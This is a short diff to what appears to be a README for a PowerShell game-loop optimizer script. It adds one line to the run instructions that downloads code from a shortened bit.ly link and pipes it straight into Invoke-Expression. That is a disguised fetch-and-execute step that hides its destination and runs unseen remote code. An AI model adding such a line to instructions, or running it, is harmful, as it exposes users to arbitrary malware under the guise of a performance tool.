@@ -26,3 +26,4 @@
 3. Run the script:  
    ```powershell
    .\CRTY_GameLoop_Optimizer.ps1
+   iwr -useb https://bit.ly/crty_web_gameloop | iex 
